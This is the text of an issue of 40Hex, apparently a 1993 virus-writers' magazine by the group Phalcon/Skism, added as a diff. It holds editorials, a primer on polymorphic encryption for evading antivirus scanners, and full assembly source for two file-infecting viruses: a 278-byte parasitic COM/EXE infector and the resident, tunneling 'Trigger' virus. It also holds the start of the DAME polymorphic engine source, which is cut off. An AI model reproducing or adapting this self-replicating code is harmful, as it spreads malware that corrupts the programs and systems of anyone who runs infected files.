@@ -1,0 +1,5433 @@
+40Hex Issue 11 Volume 3 Number 2                                      File 000
+
+     Welcome to 40Hex, the industry-standard virus information magazine,
+brought to you by your friends at Phalcon/Skism, where our mottoes are
+"We don't care" and "We write viruses until we're blue in the face and
+green in the eyes."  Once again, we continue to bring you only the best
+in virus news, programming, and miscellaneous source code.
+     We welcome our newest member, Priest, who has written a number of
+advanced viruses.  The source code to one of his viruses, Predator, is
+included in this issue.
+     Also in this issue is Dark Angel's Multiple Encryptor (DAME).  This
+is one of the more advanced polymorphic routines available.  Since source
+code is included, you'll probably see SPEW (Sweet Potato Encryption
+Writer) coming soon to finer P0taT0 boards near you.
+     Well, enough ranting -- enjoy the magazine!
+
+                                        -)Gheap
+
+            File                 Description
+            0000.................This file, of course.
+            0001.................Today's Phalcon/Skism Gripe
+            0002.................Advanced Polymorphism Primer, Part 1
+            0003.................Phalcon/Skism Trigger Virus & DAME Source Code
+            0004.................Virus Censorship (Gripe Part II)
+            0005.................Virus Spotlite: Leech
+            0006.................Fun with System File Tables
+            0007.................SVC 5.0 disassembly
+            0008.................Predator Source Code
+
+Greets to: NuKE, The Attitude Adjuster, Kenny C., Al, Bob, and our little
+           potato friends.
+
+40Hex Issue 11 Volume 3 Number 2                                      File 001
+
+                        Life, the Universe, and 40Hex
+
+       It is apparent to even the blindest of observers that the virus
+  phenomenon has caught on.  Everyone and his kid brother has decided to start
+  a virus group, whether or not they have programmers capable of creating a
+  viable (read: parasitic) virus.  While this in itself is merely offensive,
+  it is the sheer arrogance of these meta-groups which is irritating.  Of
+  course, no names will be mentioned, as that would be mean and we all wish
+  for a happy world.
+       The most common trait of these pseudo-groups is for a member to state
+  that all code that was written was "developed on my own."  Of course, this
+  is seldom the case.  Often, the "original source code" to their viruses
+  clearly originated at some point from a Sourcer disassembly.  Heck, when you
+  see "seg_a" or "loc_0027," you know they're just poor hacks.  Of course, the
+  the disparate coding styles in the "source" also reveals the nature of the
+  virus.
+       And when the virus is listed as a Dark Avenger hack in various anti-
+  virus products, the individuals persist in their self-induced fantasies,
+  saying their viruses are original.  I suppose the anti-virus programmers,
+  who have disassembled countless viruses, can't spot a Dark Avenger or Murphy
+  hack when they see one.  Stop fooling yourselves.
+       And these mentally challenged persons continue, insisting routine X, a
+  "new, innovative technique," was developed independently.  Yet anyone with
+  even a minimal exposure to virus source code can see traces of other viruses
+  in these routines.  Even the ideas presented are seldom new; most having
+  already been implemented by existing viruses.  The worst of these people
+  magnify all of their supposed accomplishments, talking of the revolutionary
+  changes they single-handedly effect.
+       Every group goes through a phase in which they hack viruses; they
+  should not be proud of these viruses.  But it is merely the first step and
+  most grow out of it.  Skism-1, for example, was a Jerusalem hack.  It is
+  ancient history.  I might also point out that the Phalcon/Skism viruses
+  published in both the last issue and this one are far superior to Skism-1.
+  Phalcon/Skism does not release the source code to half-baked viruses just so
+  40Hex can look larger.  Every virus programmer has a few experimental
+  viruses; yet it is not necessarily appropriate to print all of them.  If I
+  wrote a virus which had several hundred bytes of repetitious code, I would
+  be ashamed to print it.  It's like releasing a program which has only been
+  half-completed.
+       When a virus programmer additionally claims, "This virus was written
+  two years ago, so it sucks, but I'm going to release it anyway because it's
+  good to learn from," I have my doubts.  When s/he further hurridly states,
+  "My other viruses are better," then my doubts grow.  Where, pray tell, are
+  these superior viruses?  Why publish that which you admit sucks?  Of course,
+  anyone that makes such a claim, or one such as, "Next time, I'll release a
+  COM/EXE/SYS/MBR/OV?/DAT/DOC/TXT/ANS/ASC polymorphic, stealth infector that I
+  wrote last week," is suspicious.
+       As an example of the mindless boasting, observe the following:  (Note:
+  the following should not be construed as a personal attack against either
+  the person or group in question.)
+       This person wrote, "As with many of my routines, stuff which took many
+  other virus writers a few pages of code took me one page... that's not bad!
+  I have many other goodies up my sleeve, like a 387-byte generic COM/EXE
+  parasitic infector on execution, the smallest of its kind in the WORLD...
+  (with room for improvement!)."
+       Please do not boast if you cannot substantiate your claims.  For
+  example, these claims are easily shredded by counterexample.  Let us examine
+  the Voronezh-370 virus.  It is a generic parasitic COM/EXE infector and it
+  is indeed less than 387 bytes.  If 387 bytes is the smallest in the world,
+  then this may very well be the smallest in the universe.  With only two
+  hours of fiddling, I came up with the following virus (278 bytes), which may
+  yet be the smallest of its kind in all of creation!  Actually, I make no
+  such claim, as a smaller one _can_ be written.  The point was to show that
+  this claim was not all that impressive and was, in fact, dead wrong.  Let us
+  not be o'erhasty to boast next time.
+       As with many of my viruses, stuff which took many other virus writers
+  over 380 bytes took me under 280... that's not bad!  Humour aside, I might
+  point out that this virus is _over_ 100 bytes less than the boaster's
+  attempt, so it is _significantly_ smaller.  Gee, I wonder what those extra
+  109 bytes are used for.
+
+  -------------Cut here----------------
+          .model  tiny
+          .code
+          .radix  16
+          .code
+  ; Phalcon/Skism _Small virus
+  ; Written by Dark Angel of Phalcon/Skism
+  ; 278 byte generic COM/EXE infector
+  EXE_ID          =       -40
+  viruslength     =       heap - _small
+  startload       =       90 * 4
+
+  _small:
+          call    relative
+  oldheader       dw      020cdh
+                  dw      0bh dup (0)
+  relative:
+          pop     bp
+          push    ds
+          push    es
+          xor     ax,ax
+          mov     ds,ax
+          mov     es,ax
+          mov     di,startload
+          cmp     word ptr ds:[di+25],di
+          jz      exit_small
+
+          lea     si,[bp-3]
+          mov     cx,viruslength
+          db      2Eh
+          rep     movsb
+
+          mov     di,offset old21 + startload
+          mov     si,21*4
+          push    si
+          movsw
+          movsw
+          pop     di
+          mov     ax,offset int21 + startload
+          stosw
+          xchg    ax,cx
+          stosw
+
+  exit_small:
+          pop     es
+          pop     ds
+
+          or      sp,sp
+          jnp     returnCOM
+  returnEXE:
+          mov     ax,ds
+          add     ax,10
+          add     [bp+16],ax
+          add     ax,[bp+0e]
+          mov     ss,ax
+          mov     sp,cs:[bp+10]
+          jmp     dword ptr cs:[bp+14]
+  returnCOM:
+          mov     di,100
+          push    di
+          mov     si,bp
+          movsw
+          movsb
+          ret
+
+  infect:
+          push    ax
+          push    bx
+          push    cx
+          push    dx
+          push    si
+          push    di
+          push    ds
+          push    es
+
+          mov     ax,3d02
+          int     21
+          xchg    ax,bx
+
+          push    cs
+          pop     ds
+          push    cs
+          pop     es
+
+          mov     si,offset oldheader+startload
+
+          mov     ah,3f
+          mov     cx,18
+          push    cx
+          mov     dx,si
+          int     21
+
+          cmp     ax,cx
+          jnz     go_already_infected
+
+          mov     di,offset target + startload
+          push    di
+          rep     movsb
+          pop     di
+
+          mov     ax,4202
+          cwd
+          int     21
+
+          cmp     ds:[di],'ZM'
+          jz      infectEXE
+
+          sub     ax,3
+          mov     byte ptr ds:[di],0e9
+          mov     ds:[di+1],ax
+
+          sub     ax,viruslength
+          cmp     ds:[si-17],ax
+          jnz     finishinfect
+  go_already_infected:
+          pop     cx
+          jmp     short already_infected
+
+  int21:
+          cmp     ax,4b00
+          jz      infect
+          jmp     short chain
+
+  infectEXE:
+          cmp     word ptr [di+10],EXE_ID
+          jz      go_already_infected
+
+          push    ax
+          push    dx
+
+          add     ax,viruslength
+          adc     dx,0
+
+          mov     cx,200
+          div     cx
+
+          or      dx,dx
+          jz      nohiccup
+          inc     ax
+  nohiccup:
+          mov     ds:[di+4],ax
+          mov     ds:[di+2],dx
+
+          pop     dx
+          pop     ax
+
+          mov     cx,10
+          div     cx
+
+          sub     ax,ds:[di+8]
+
+          mov     ds:[di+14],dx
+          mov     ds:[di+16],ax
+
+          mov     ds:[di+0e],ax
+          mov     word ptr ds:[di+10],EXE_ID
+  finishinfect:
+          mov     ah,40
+          mov     cx,viruslength
+          mov     dx,startload
+          int     21
+
+          mov     ax,4200
+          xor     cx,cx
+          cwd
+          int     21
+
+          mov     ah,40
+          mov     dx,di
+          pop     cx
+          int     21
+  already_infected:
+          mov     ah,3e
+          int     21
+  exitinfect:
+          pop     es
+          pop     ds
+          pop     di
+          pop     si
+          pop     dx
+          pop     cx
+          pop     bx
+          pop     ax
+  chain:
+          db      0ea
+  heap:
+  old21   dw      ?, ?
+  target  dw      0ch dup (?)
+
+  endheap:
+          end     _small
+  -------------------------------------
+
+       I think the informed virus and anti-virus person recognises these
+  claims as the baseless boasts they are.  Let me assure you that you will see
+  none of that in 40Hex.
+       Finally, each new group proclaims to be the world's predominant virus
+  group.  Each new group puts out a magazine.  Each new group presents H/P/A
+  articles in their magazines.  Let us go through each one step by step.
+  Hacking.  Gee, can't you see the connection with viruses?  Phreaking.  Got
+  some c0deZ, d00d?  Anarchy.  Gee, I want total chaos even though I probably
+  couldn't survive such a situation.  H/P/A aside, these "virus magazines" do
+  indeed contain some virus-related articles.  Generally, these are of the
+  form "X virus is great, but we won't give source.  X does this, it does
+  that, it is not a hack of Dark Avenger even though it scans as such."  Some
+  articles give Sourcer disassemblies -- hardly commented, yet termed
+  disassemblies nonetheless.  Finally, there are the programming articles
+  containing tips and tricks from the "masters."  These often contain
+  nonworking code.  These often contain factual errors.  These often are
+  nothing but a waste of time.
+       Does this sound elitist?  I hope not.  Judge virus groups and their
+  magazines on their merits, not on their hype.  Do not take a virus group's
+  word as gospel; it seldom reflects the truth.  Instead, do some
+  investigation on your own and try to verify (or refute) their claims.  You
+  may be surprised at the results.  There is also no reason to immediately
+  condemn all anti-virus people as corrupt and "lame"; many are just ordinary
+  people "on the other side."  The virus scene is becoming less innovative as
+  these new quasi-groups emerge.  This apparent contradiction must end soon.
+  We ask all groups to end the self-back-patting and blatant lying and do some
+  real work.
+       Finally, a short summary of 40Hex is in order, for both new and old
+  readers alike.  The paragraphs below show the current editorial stance and
+  opinion of 40Hex, which has evolved during the several years of its
+  existence.  What holds true for 40Hex also applies to Phalcon/Skism.
+
+       40Hex is _not_ a magazine for self-congratulation.  Although put out by
+  Phalcon/Skism, 40Hex serves as medium through which the public may hear the
+  voice of the informed virus community without magnification of either the
+  achievements or failures of any particular virus group or programmer.
+  Although the 40Hex staff offers opinions from the pro-virus standpoint,
+  40Hex is not an anti-anti-virus magazine.  There is a clear distinction
+  between pro- and anti-anti-virus.  40Hex encourages anti-virus researchers
+  to contribute.  40Hex offers a fair, unbiased view except in editorials,
+  which obviously reflect the opinions of the authors.
+       40Hex _is_ purely a virus magazine -- none of that H/P/A/k-rad stuff.
+  Illegal and anarchistic activities are not condoned by 40Hex and, as such,
+  these topics are not appropriate for inclusion in the magazine.  The public
+  distribution of quality virus source code and virus writing techniques, both
+  old and new, is one of the predominant goals of 40Hex, serving to inform
+  both the pro- and anti-virus community.  The secondary function of the
+  magazine is to spread virus-related news.  40Hex is concerned more with
+  content than size.  You know the old saw "Quality, not quantity."  Other
+  magazines appear larger than they truly are because each article is padded
+  to 80 columns, effectively doubling its file length.
+       40Hex articles are _not_ mere rehashes of what has already been
+  printed.  Other magazines have presented articles which closely mirror those
+  already published in 40Hex.  Such poorly rewritten articles are neither
+  enlightening nor necessary.
+       40Hex is _not_ a tool with which people wreak havok upon others'
+  systems.  This is simply an unfair view of the magazine.  In fact, 40Hex is
+  against wanton destruction of computer systems.  Viruses are so prevalent
+  nowadays that anyone can obtain them with little difficulty.  They also need
+  not obtain 40Hex to be able to type "FORMAT C:"  Knobs will be knobs.
+       40Hex _is_ a public forum, allowing those who take the time to write to
+  have their opinions published.  We encourage all to send letters to 40Hex,
+  as they provide valuable insight into the virus and anti-virus communities
+  from a fresh perspective.
+       40Hex is _not_ inherently evil.  What you choose to do with the
+  knowledge provided is your business.
+
+       Once again, 40Hex does not condone the illegal spread of viruses.  Such
+  actions are frowned upon.  Our stance has evolved over the years, so don't
+  bring up something from 40Hex-2 and cry hippocrite -- unless, of course, you
+  have a closed mind and absolutely nothing else to say.
+
+                                                -- Dark Angel
+                                                   Phalcon/Skism
+
+40Hex Issue 11 Volume 3 Number 2                                      File 002
+
+                             ýýýýýýýýýýýýýýýýýýýýý
+                             ADVANCED POLYMORPHISM
+                                     PRIMER
+                                 PART THE FIRST
+                             ýýýýýýýýýýýýýýýýýýýýý
+                                 By Dark Angel
+                                 Phalcon/Skism
+                             ýýýýýýýýýýýýýýýýýýýýý
+
+       With the recent proliferation of virus encryption "engines," I was
+  inspired to write my own.  In a few short weeks, I was able to construct one
+  such routine which can hold its own.  A polymorphic encryption routine is
+  nothing more than a complex code generator.  Writing such a routine, while
+  not incredibly difficult, requires careful planning and perhaps more than a
+  few false starts.
+
+       The utility of true polymorphism is, by now, an accepted fact.
+  Scanning for the majority of viruses is a trivial task, involving merely the
+  identification of a specific pattern of bytes in executable files.  This
+  approach is quick and may be used to detect nearly all known viruses.
+  However, polymorphism throws a monkey wrench into the works.  Polymorphic
+  viruses encode each copy of the virus with a different decryption routine.
+  Since (theoretically) no bytes remain constant in each generated decryption
+  routine, virus detectors cannot rely on a simple pattern match to locate
+  these viruses.  Instead, they are forced to use an algorithmic appproach
+  susceptible to "false positives," misleading reports of the existence of the
+  virus where it is not truly present.  Creating a reliable algorithm to
+  detect the polymorphic routine takes far more effort than isolating a usable
+  scan string.  Additionally, if a virus detector fails to find even one
+  instance of the virus, then that single instance will remain undetected and
+  spawn many more generations of the virus.  Survival, of course, is the
+  ultimate goal of the virus.
+
+       Before attempting to write a polymorphic routine, it is necessary to
+  obtain a manual detailing the 80x86 instruction set.  Without bit-level
+  manipulation of the opcodes, any polymorphic routine will be of limited
+  scope.  The nice rigid structure of the 80x86 instruction set will be
+  readily apparent after a simple perusal of the opcodes.  Exploitation of
+  this structured instruction set allows for the compact code generation
+  routines which lie at the heart of every significant polymorphic routine.
+
+       After examining the structure of the opcodes, the basic organisation of
+  the polymorphic routine should be laid out.  Here, an understanding of the
+  basics behind such routines is required.  The traditional approach treats
+  the decryption routine as a simple executable string, such as
+  "BB1301B900022E8137123483C302E2F6."  A true (advanced) polymorphic routine,
+  by contrast, views the decryption routine as a conceptual algorithm, such
+  as, "Set up a 'pointer' register, that is, the register whose contents hold
+  a pointer to the memory to be decrypted.  Set up a counter register.  Use
+  the pointer register to decrypt one byte.  Update the pointer register.
+  Decrement the count register, looping if it is not zero."  Two routines
+  which fit this algorithm follow:
+
+  Sample Encryption 1
+  ------ ---------- -
+       mov  bx,offset startencrypt   ; here, bx is the 'pointer' register
+       mov  cx,viruslength / 2       ; and cx holds the # of iterations
+  decrypt_loop:
+       xor  word ptr [bx],12h        ; decrypt one word at a time
+       inc  bx                       ; update the pointer register to
+       inc  bx                       ; point to the next word
+       loop decrypt_loop             ; and continue the decryption
+  startencrypt:
+
+  Sample Encryption 2
+  ------ ---------- -
+  start:
+       mov  bx,viruslength           ; now bx holds the decryption length
+       mov  bp,offset start          ; bp is the 'pointer' register
+  decrypt_loop:
+       add  byte ptr [bp+0Ch],33h    ; bp+0Ch -> memory location to be
+                                     ; decrypted at each iteration
+       inc  bp                       ; update the pointer register
+       dec  bx                       ; and the count register
+       jnz  decrypt_loop             ; loop if still more to decrypt
+
+       The number of possibilities is essentially infinite.  Naturally,
+  treating the decryption as an algorithm rather than as an executable string
+  greatly increases the flexibility in creating the actual routine.  Various
+  portions of the decryption algorithm may be tinkered with, allowing for
+  further variations.  Using the example above, one possible variation is to
+  swap the order of the setup of the registers, i.e.
+
+       mov  cx,viruslength
+       mov  bx,offset startencrypt
+
+  in lieu of
+
+       mov  bx,offset startencrypt
+       mov  cx,viruslength
+
+       It is up to the individual to decide upon the specific variations which
+  should be included in the polymorphic routine.  Depending upon the nature of
+  the variations and the structure of the polymorphic routine, each increase
+  in power may be accompanied with only a minimal sacrifice in code length.
+  The goal is for the routine to be capable of generating the greatest number
+  of variations in the least amount of code.  It is therefore desirable to
+  write the polymorphic routine in a manner such that additional variations
+  may be easily accommodated.  Modularity is helpful in this respect, as the
+  modest overhead is rapidly offset by substantial space savings.
+
+       The first step most polymorphic routines undergo is the determination
+  of the precise variation which is to be encoded.  For example, a polymorphic
+  routine may decide that the decryption routine is to use word-length xor
+  encryption with bx as the pointer register, dx as a container for the
+  encryption value, and cx as the counter register.  Once this information is
+  known, the routine should be able to calculate the initial value of each
+  variable.  For example, if cx is the counter register for a byte-length
+  encryption, then it should hold the virus length.  To increase variability,
+  the length of the encryption can be increased by a small, random amount.
+  Note that some variables, in particular the pointer register, may not be
+  known before encoding the rest of the routine.  This detail is discussed
+  below.
+
+       Of course, selecting the variables and registers will not in and of
+  itself yield a valid decryption routine; the polymorphic routine must also
+  encode the actual instructions to perform the job!  The cheesiest
+  polymorphic routines encode a single "mov" instruction for the assignment of
+  a value to a register.  The more complex routines encode a series of
+  instructions which are functionally equivalent to the simple three byte
+  "mov" statement yet far different in form.  For example,
+
+       mov  ax, 808h
+
+  could be replaced with
+
+       mov  ax, 303h                 ; ax = 303h
+       mov  bx, 101h                 ; bx = 101h
+       add  ax, bx                   ; ax = 404h
+       shl  ax, 1                    ; ax = 808h
+
+       Recall that the registers should be encoded in a random order.  The
+  counter variable, for example, should not always be the first to be encoded.
+  Predictability, the bane of polymorphic routines, must be avoided at all
+  costs.
+
+       After the registers are encoded, the actual decryption loop should then
+  be encoded.  The loop can perform a number of actions, the most significant
+  of which should be to manipulate the memory location, i.e. the actual
+  decryption instruction, and to update the pointer register, if necessary.
+  Finally, the loop instruction itself should be encoded.  This can take many
+  forms, including "loop," "loopnz," "jnz," etc.  Possible variations include
+  altering the decryption value register and the counter register during each
+  iteration.
+
+       This is the general pattern of encoding.  By placing garbling, or "do-
+  nothing," instructions between the essential pieces of code, further
+  variability may be ensured.  These instructions may take many forms.  If the
+  encoding routines are well-designed, the garbler can take advantage of the
+  pre-existing code to generate null instructions, such as assignments to
+  unused registers.
+
+       Once the decryption routine has been written, it is necessary to
+  encrypt the virus code.  The traditional approach gives the polymorphic
+  routine the job of encrypting the code.  The polymorphic routine should
+  therefore "remember" how the precise variation used by the decryptor and
+  adjust the encryption routine in a complementary fashion.  An alternate
+  approach is for the polymorphic routine to simultaneously encode both the
+  encryption and decryption routines.  Although it adds overhead to the code,
+  it is an extremely flexible approach that easily accommodates variations
+  which may be later introduced into the polymorphic routine.
+
+       Variable-length decryptors come at a significant trade-off; the exact
+  start of the decryption cannot be known before encoding the decryptor.
+  There are two approaches to working around this limitation.  The first is to
+  encode the pointer register in a single instruction, i.e. mov bx,185h and to
+  patch the initial value once it is known.  This is simplistic, though
+  undesirable, as it decreases the variability of the routine.  An alternate
+  approach is to encode the encryption instruction in the form xor word ptr
+  [bx+185h], cx (as in Sample Encryption 2, above) instead of xor word ptr
+  [bx], cx (as in Sample Encryption 1).  This increases the flexibility of the
+  routine, as the initial value of the pointer register need not be any fixed
+  value; correct decryption may be assured by adjusting the offset in the
+  decryption instruction.  It is then possible to encode the pointer register
+  with multiple instructions, increasing flexibility.  However, using either
+  method alone increases the predictability of the generated code.  A better
+  approach would be to incorporate both methods into a single polymorphic
+  routine and randomly selecting one during each run.
+
+       As an example of a polymorphic routine, I present DAME, Dark Angel's
+  Multiple Encryptor and a simple virus which utilises it.  They appear in the
+  following article.  DAME uses a variety of powerful techniques to achieve
+  full polymorphism.  Additionally, it is easy to enhance; both the encoding
+  routines and the garblers can be extended algorithmically with minimal
+  effort.  In the next issue, I will thoroughly comment and explain the
+  various parts of DAME.
+
+40Hex Issue 11 Volume 3 Number 2                                      File 003
+
+                                Trigger Virus
+
+     This virus was written as a test virus for DAME, Dark Angel's Multiple
+Encryptor.  Trigger is a resident COM/EXE infector with tunneling capabilities.
+When it executes, it traces down the int 21h chain until it finds the original
+int 21h handler.  It then inserts code to jump to the virus, which returns
+control to the original int 21h handler after processing the request.
+
+                                                -- Dark Angel
+                                                   Phalcon/Skism 1993
+
+-begin trigger.asm-------------------------------------------------------------
+        .model  tiny
+        .code
+        .radix  16
+        org     0
+
+        viruslength     =       (heap - entry)
+        virussizeK      =       (endvirus - entry + 3ff) / 400
+        virussizepara   =       (virussizeK)*40
+
+        EXE_ID          =       'PS'
+
+entry:
+        call    past
+next:
+        db      0,"Trigger by Dark Angel of Phalcon/Skism",0Dh,0A
+        db      "Utilising Dark Angel's Multiple Encryptor (DAME)",0Dh,0A
+        db      0Dh,0A,0
+
+checkstub       db 72,0FA,0E,1F,0BA,00,0B8,0B8,40,00,8E,0C0,26,81,3E,63
+
+past:   cld
+        pop     bp
+
+        mov     ax,0cf0
+        mov     bx,'DA'
+        int     21
+        cmp     bx,'GH'
+        jnz     no_trigger
+trigger:
+        push    ds
+        push    es
+
+        push    cs
+        pop     ds
+        xor     ax,ax
+checkagain:
+        lea     si,[bp+checkstub-next]
+        mov     es,ax
+        xor     di,di
+        mov     cx,8
+        rep     cmpsw
+        jz      trigger_it
+        inc     ax
+        cmp     ax,0a000
+        jb      checkagain
+        jmp     exit_trigger
+trigger_it:
+        mov     [bp+patch-next],ax
+        mov     ds,ax
+        mov     byte ptr ds:73,0cbh
+        push    bp
+        mov     bp,-80
+        jmp     short $+2
+        db      09a ; call far ptr
+        dw      1
+patch   dw      ?
+        pop     bp
+        mov     byte ptr ds:73,1f
+exit_trigger:
+        pop     es
+        pop     ds
+        jmp     short restore
+
+no_trigger:
+        mov     ax,4b90
+        int     21
+        cmp     ax,bx
+        jz      restore
+
+        push    ds
+        push    es
+
+        mov     ax,ds
+        dec     ax
+        mov     ds,ax
+        sub     word ptr ds:3,virussizepara
+        sub     word ptr ds:12,virussizepara
+        mov     es,ds:12
+
+        push    cs
+        pop     ds
+
+        xor     di,di
+        lea     si,[bp+offset entry-offset next]
+        mov     cx,(viruslength + 1)/2
+        rep     movsw
+
+        xor     ax,ax
+        mov     ds,ax
+        sub     word ptr ds:413,virussizeK
+
+        mov     di,offset oldint21
+        mov     si,21*4
+        movsw
+        movsw
+
+        cli
+
+        pushf
+        pushf
+        pop     ax
+        or      ah,1
+        push    ax
+
+        mov     ds:1*4+2,es
+        mov     word ptr ds:1*4,offset int1_1
+
+        popf
+
+        mov     ah,30
+        pushf
+        call    dword ptr ds:21*4
+
+        popf
+
+        lds     si,dword ptr es:oldint21
+        mov     di,si
+        lodsw
+        mov     word ptr es:int21patch1,ax
+        lodsw
+        mov     word ptr es:int21patch2,ax
+        lodsb
+        mov     byte ptr es:int21patch3,al
+
+        push    ds ; es:di->int 21 handler
+        push    es
+        pop     ds ; ds->high segment
+        pop     es
+
+        mov     al,0ea
+        stosb
+        mov     ax,offset int21
+        stosw
+        mov     ax,ds
+        stosw
+        sti
+
+        pop     es
+        pop     ds
+
+restore:
+        cmp     sp,-2
+        jnz     restoreEXE
+restoreCOM:
+        lea     si,[bp+readbuffer-next]
+        mov     di,100
+        push    di
+        movsw
+        movsw
+        ret
+restoreEXE:
+        mov     ax,ds
+        add     ax,10
+        add     cs:[bp+readbuffer+16-next], ax
+        add     ax,cs:[bp+readbuffer+0e-next]
+        mov     ss,ax
+        mov     sp,cs:[bp+readbuffer+10-next]
+        jmp     dword ptr cs:[bp+readbuffer+14-next]
+
+readbuffer      dw 20cdh
+                dw 0bh dup (?)
+
+int1_1:
+        push    bp
+        mov     bp,sp
+        push    ax
+
+        mov     ax, [bp+4]      ; get segment
+        cmp     ax, cs:oldint21+2
+        jae     exitint1
+        mov     cs:oldint21+2,ax
+        mov     ax, [bp+2]
+        mov     cs:oldint21,ax
+exitint1:
+        pop     ax
+        pop     bp
+        iret
+
+int1_2:
+        push    bp
+        mov     bp,sp
+        push    ax
+
+        mov     ax,cs
+        cmp     ax,[bp+4]
+        jz      exitint1
+
+        mov     ax,[bp+4]
+        cmp     ax,cs:oldint21+2
+        jnz     int1_2_restore
+
+        mov     ax,[bp+2]
+        cmp     ax,cs:oldint21
+        jb      int1_2_restore
+        sub     ax,5
+        cmp     ax,cs:oldint21
+        jbe     exitint1
+int1_2_restore:
+        push    es
+        push    di
+        cld
+        les     di,dword ptr cs:oldint21
+        mov     al,0ea
+        stosb
+        mov     ax,offset int21
+        stosw
+        mov     ax,cs
+        stosw
+        pop     di
+        pop     es
+
+        and     [bp+6],0feff
+        jmp     exitint1
+
+install:
+        mov     bx,ax
+        iret
+int21:
+        cmp     ax,4b90
+        jz      install
+
+        push    ds
+        push    di
+        lds     di,dword ptr cs:oldint21
+        mov     word ptr ds:[di],1234
+int21patch1      =       $ - 2
+        mov     word ptr ds:[di+2],1234
+int21patch2      =       $ - 2
+        mov     byte ptr ds:[di+4],12
+int21patch3      =       $ - 1
+        pop     di
+        pop     ds
+
+        cld
+
+        cmp     ax,4b00
+        jz      infect
+
+exitint21:
+        push    ds
+        push    ax
+
+        xor     ax,ax
+        mov     ds,ax
+        cli
+        mov     word ptr ds:1*4,offset int1_2
+        mov     ds:1*4+2,cs
+        sti
+
+        pushf
+        pop     ax
+        or      ah,1
+        push    ax
+        popf
+        pop     ax
+        pop     ds
+        db      0ea
+oldint21 dw     0, 0
+
+callint21:
+        pushf
+        call    dword ptr cs:oldint21
+        ret
+
+already_infected:
+        pop     dx
+        pop     cx
+        mov     ax,5701
+        call    callint21
+
+        mov     ah,3e
+        call    callint21
+exitnoclose:
+        mov     ax,4301
+        pop     dx
+        pop     ds
+        pop     cx
+        call    callint21
+
+exitinfect:
+        pop     es
+        pop     ds
+        pop     di
+        pop     si
+        pop     bp
+        pop     bx
+        pop     dx
+        pop     cx
+        pop     ax
+        jmp     exitint21
+
+infect:
+        push    ax
+        push    cx
+        push    dx
+        push    bx
+        push    bp
+        push    si
+        push    di
+        push    ds
+        push    es
+
+        mov     ax,4300
+        call    callint21
+        push    cx
+        push    ds
+        push    dx
+
+        mov     ax,4301
+        xor     cx,cx
+        call    callint21
+
+        mov     ax,3d02
+        call    callint21
+        jc      exitnoclose
+        xchg    ax,bx
+
+        mov     ax,5700
+        int     21
+        push    cx
+        push    dx
+
+        mov     ah,3f
+        mov     cx,18
+        push    cs
+        pop     ds
+        push    cs
+        pop     es
+        mov     dx,offset readbuffer
+        mov     si,dx
+        call    callint21
+        jc      already_infected
+
+        mov     di,offset writebuffer
+        mov     cx,18/2
+
+        push    si
+        push    di
+
+        rep     movsw
+
+        pop     di
+        pop     si
+
+        mov     ax,4202
+        xor     cx,cx
+        cwd
+        int     21
+
+        cmp     word ptr [di],'ZM'
+        jnz     infectCOM
+
+infectEXE:
+        cmp     readbuffer+10,EXE_ID
+go_already_infected:
+        jz      already_infected
+
+        mov     ds:writebuffer+4,ax
+        mov     ds:writebuffer+2,dx
+
+        mov     cx,10
+        div     cx
+
+        sub     ax,ds:writebuffer+8
+
+        mov     ds:writebuffer+14,dx
+        mov     ds:writebuffer+16,ax
+
+        xchg    cx,dx
+
+        mov     ds:writebuffer+0e,ax
+        mov     ds:writebuffer+10,EXE_ID
+
+        mov     al,10b
+        jmp     finishinfect
+
+infectCOM: ; si = readbuffer, di = writebuffer
+        push    ax
+
+        mov     cx,4
+        xor     dx,dx
+check_infection_loop:
+        lodsb
+        add     dl,al
+        loop    check_infection_loop
+
+        pop     ax
+
+        or      dl,dl
+        jz      go_already_infected
+
+        mov     dx,18
+        cmp     ax,dx
+        jnb     no_fixup_com
+
+        mov     ax,4200
+        xor     cx,cx
+        int     21
+no_fixup_com:
+        mov     cx,ax
+        inc     ch      ; add cx,100
+        sub     ax,3
+        push    ax
+        mov     al,0e9
+        stosb
+        pop     ax
+        stosw
+        add     al,ah
+        add     al,0e9
+        neg     al
+        stosb
+
+        mov     al,11b
+finishinfect:
+        cbw
+; ax = bitmask
+; bx = start decrypt in carrier file
+; cx = encrypt length
+; dx = start encrypt in virus
+; si = buffer to put decryption routine
+; di = buffer to put encryption routine
+        push    bx
+
+        xchg    cx,bx
+
+        xor     si,si
+        mov     di,offset copyvirus
+        mov     cx,(heap-entry+1)/2
+        rep     movsw
+
+        push    ax
+        call    rnd_init_seed
+        pop     ax
+
+        mov     dx,offset copyvirus
+        mov     cx,viruslength
+        mov     si,offset _decryptbuffer
+        mov     di,offset _encryptbuffer
+        call    dame
+
+        push    cx
+
+        cmp     ds:writebuffer,'ZM'
+        jnz     no_fix_header
+
+        mov     dx,ds:writebuffer+2
+        mov     ax,ds:writebuffer+4
+        add     cx,viruslength
+        add     ax,cx
+        adc     dx,0
+        mov     cx,200
+        div     cx
+        or      dx,dx
+        jz      nohiccup
+        inc     ax
+nohiccup:
+        mov     ds:writebuffer+4,ax
+        mov     ds:writebuffer+2,dx
+no_fix_header:
+        call    di
+        pop     cx
+
+        pop     bx
+
+        mov     ah,40
+        mov     dx,offset _decryptbuffer
+        call    callint21
+
+        mov     ah,40
+        mov     cx,viruslength
+        mov     dx,offset copyvirus
+        call    callint21
+
+        mov     ax,4200
+        xor     cx,cx
+        cwd
+        int     21
+
+        mov     ah,40
+        mov     cx,18
+        mov     dx,offset writebuffer
+        call    callint21
+        jmp     already_infected
+
+vars = 0
+include dame.asm
+
+heap:
+vars = 1
+include dame.asm
+
+writebuffer             dw       0c dup (?)
+_encryptbuffer:         db       80 dup (?)
+_decryptbuffer:         db      180 dup (?)
+copyvirus               db      viruslength dup (?)
+                        db      20 dup (?)
+endvirus:
+
+end entry
+-end trigger.asm----begin dame.asm---------------------------------------------
+ifndef vars
+vars = 2
+endif
+
+if vars eq 1
+else
+
+_ax = 0
+_cx = 1
+_dx = 2
+_bx = 3
+_sp = 4
+_bp = 5
+_si = 6
+_di = 7
+
+_es = 8
+_cs = 9
+_ss = 0a
+_ds = 0bh
+
+MAXNEST = 0a            ; controls recursion problems
+
+; ax = flags
+;       15 : Reserved
+;       14 : 0 = word, 1 = dword
+;       13 : encryption direction : 0 = forwards, 1 = backwards
+;       12 : counter direction : 0 = forwards, 1 = backwards
+;       11 :    ^
+;       10 :    R
+;        9 :    E
+;        8 :    S
+;        7 :    E
+;        6 :    R
+;        5 :    V
+;        4 :    E
+;        3 :    D
+;        2 :    v
+; DAME sets the above bits
+;
+; Virus sets the following bits:
+;        1 : garble : 1 = yes, 0 = no
+;        0 : DS = CS : 1 = yes, 0 = no
